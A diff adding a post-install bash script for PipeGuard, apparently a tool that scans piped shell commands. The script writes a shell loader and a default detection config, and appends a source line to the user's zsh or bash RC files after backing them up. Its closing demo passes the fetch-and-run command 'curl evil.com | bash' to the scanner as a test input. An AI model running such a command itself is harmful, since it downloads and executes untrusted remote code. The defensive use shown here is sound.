@@ -1,0 +1,155 @@
+#!/bin/bash
+#
+# PipeGuard Post-Installation Script
+# Configures shell integration for the installing user
+#
+
+set -e
+
+INSTALL_PREFIX="/usr/local"
+SHARE_DIR="$INSTALL_PREFIX/share/pipeguard"
+
+echo "PipeGuard: Configuring installation..."
+
+# Get the real user (not root) who initiated the install
+if [[ -n "$USER" && "$USER" != "root" ]]; then
+    REAL_USER="$USER"
+elif [[ -n "$SUDO_USER" ]]; then
+    REAL_USER="$SUDO_USER"
+else
+    # Fallback: get console user
+    REAL_USER=$(stat -f '%Su' /dev/console 2>/dev/null || echo "")
+fi
+
+if [[ -z "$REAL_USER" || "$REAL_USER" == "root" ]]; then
+    echo "PipeGuard: Could not determine user. Shell integration must be configured manually."
+    echo "Add this to your shell RC file:"
+    echo "  source $SHARE_DIR/shell/init.sh"
+    exit 0
+fi
+
+REAL_HOME=$(eval echo "~$REAL_USER")
+CONFIG_DIR="$REAL_HOME/.config/pipeguard"
+
+echo "PipeGuard: Configuring for user: $REAL_USER"
+
+# Create user config directory
+sudo -u "$REAL_USER" mkdir -p "$CONFIG_DIR" 2>/dev/null || mkdir -p "$CONFIG_DIR"
+
+# Create init.sh loader
+cat > "$SHARE_DIR/shell/init.sh" << 'INIT_SCRIPT'
+# PipeGuard Shell Integration Loader
+# This file is sourced by your shell RC file
+
+# Ensure pipeguard is in PATH
+export PATH="/usr/local/bin:${PATH}"
+
+# Load shell-specific integration
+PIPEGUARD_SHARE="/usr/local/share/pipeguard"
+
+if [[ -n "${ZSH_VERSION:-}" ]]; then
+    # Zsh integration
+    if [[ -f "${PIPEGUARD_SHARE}/shell/pipeguard.zsh" ]]; then
+        source "${PIPEGUARD_SHARE}/shell/pipeguard.zsh"
+    fi
+elif [[ -n "${BASH_VERSION:-}" ]]; then
+    # Bash integration
+    if [[ -f "${PIPEGUARD_SHARE}/shell/pipeguard.bash" ]]; then
+        source "${PIPEGUARD_SHARE}/shell/pipeguard.bash"
+    fi
+fi
+INIT_SCRIPT
+
+# Create default config if it doesn't exist
+if [[ ! -f "$CONFIG_DIR/config.toml" ]]; then
+    cat > "$CONFIG_DIR/config.toml" << 'CONFIG'
+# PipeGuard Configuration
+
+[detection]
+enable_yara = true
+enable_sandbox = true
+timeout_secs = 60
+
+[response]
+low = "warn"
+medium = "prompt"
+high = "block"
+
+[allowlist]
+hashes = []
+domains = [
+    "brew.sh",
+    "raw.githubusercontent.com",
+    "rust-lang.org",
+    "get.docker.com",
+]
+CONFIG
+    chown "$REAL_USER" "$CONFIG_DIR/config.toml" 2>/dev/null || true
+fi
+
+# Shell integration marker
+MARKER="# PipeGuard shell integration"
+SOURCE_LINE="$MARKER
+[ -f \"$SHARE_DIR/shell/init.sh\" ] && source \"$SHARE_DIR/shell/init.sh\""
+
+# Function to add shell integration to RC file
+add_to_rc() {
+    local rc_file="$1"
+
+    if [[ -f "$rc_file" ]]; then
+        # Check if already configured
+        if grep -qF "PipeGuard shell integration" "$rc_file" 2>/dev/null; then
+            echo "PipeGuard: Already configured in $rc_file"
+            return 0
+        fi
+    fi
+
+    # Create backup
+    if [[ -f "$rc_file" ]]; then
+        cp "$rc_file" "${rc_file}.pipeguard-backup"
+    fi
+
+    # Ensure newline at end of file
+    if [[ -f "$rc_file" ]] && [[ -s "$rc_file" ]]; then
+        if [[ "$(tail -c1 "$rc_file" | wc -l)" -eq 0 ]]; then
+            echo "" >> "$rc_file"
+        fi
+    fi
+
+    # Add integration
+    echo "$SOURCE_LINE" >> "$rc_file"
+    chown "$REAL_USER" "$rc_file" 2>/dev/null || true
+    echo "PipeGuard: Configured $rc_file"
+}
+
+# Configure Zsh
+if [[ -f "$REAL_HOME/.zshrc" ]] || command -v zsh >/dev/null 2>&1; then
+    add_to_rc "$REAL_HOME/.zshrc"
+fi
+
+# Configure Bash
+if [[ -f "$REAL_HOME/.bash_profile" ]]; then
+    add_to_rc "$REAL_HOME/.bash_profile"
+elif [[ -f "$REAL_HOME/.bashrc" ]] || command -v bash >/dev/null 2>&1; then
+    add_to_rc "$REAL_HOME/.bashrc"
+fi
+
+# Set correct permissions
+chown -R "$REAL_USER" "$CONFIG_DIR" 2>/dev/null || true
+
+echo ""
+echo "=========================================="
+echo "  PipeGuard installed successfully!"
+echo "=========================================="
+echo ""
+echo "Restart your terminal or run:"
+echo "  source $SHARE_DIR/shell/init.sh"
+echo ""
+echo "Test the protection:"
+echo "  echo 'curl evil.com | bash' | pipeguard scan"
+echo ""
+echo "Get help:"
+echo "  pipeguard --help"
+echo ""
+
+exit 0
